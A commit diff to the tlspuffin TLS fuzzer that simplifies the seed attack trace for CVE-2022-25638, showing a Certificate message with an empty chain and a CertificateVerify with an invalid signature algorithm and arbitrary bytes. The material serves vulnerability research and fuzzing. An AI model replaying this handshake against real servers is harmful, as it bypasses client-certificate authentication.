e9e4d446e0328ee1f54deccd5dbf281174b4d0a5
Maximilian Ammann <max@maxammann.org>
2022-07-08 11:33:07 +0200

    Simplify attack trace for seed_cve_2022_25638

--- tlspuffin/src/tls/seeds.rs
+++ tlspuffin/src/tls/seeds.rs
@@ -866,20 +866,26 @@ pub fn seed_cve_2022_25638(server: AgentName, server_put: PutDescriptor) -> Trac
     let certificate_rsa = term! {
         fn_certificate13(
             (fn_get_context((@certificate_request_message))),
-            (fn_append_certificate_entry(
+            fn_empty_certificate_chain
+            // Or append eve cert
+            /*(fn_append_certificate_entry(
                 (fn_certificate_entry(
                     fn_eve_cert
                 )),
               fn_empty_certificate_chain
-            ))
+            ))*/
         )
     };
 
     let certificate_verify_rsa = term! {
         fn_certificate_verify(
             (fn_invalid_signature_algorithm),
-            fn_eve_pkcs1_signature
-            /*(fn_rsa_sign_client(
+            // Option 1 (something random, only possible because of fn_empty_certificate_chain):
+            fn_eve_cert // or fn_new_pubkey12, fn_empty_bytes_vec
+            // Option 2 (impersonating eve, you have to send eve cert):
+            // fn_eve_pkcs1_signature
+            // Option 3 (for testing):
+            /* (fn_rsa_sign_client(
                 (fn_certificate_transcript(((server, 0)))),
                 fn_eve_private_key, // some random private key
                 fn_rsa_pkcs1_signature_algorithm
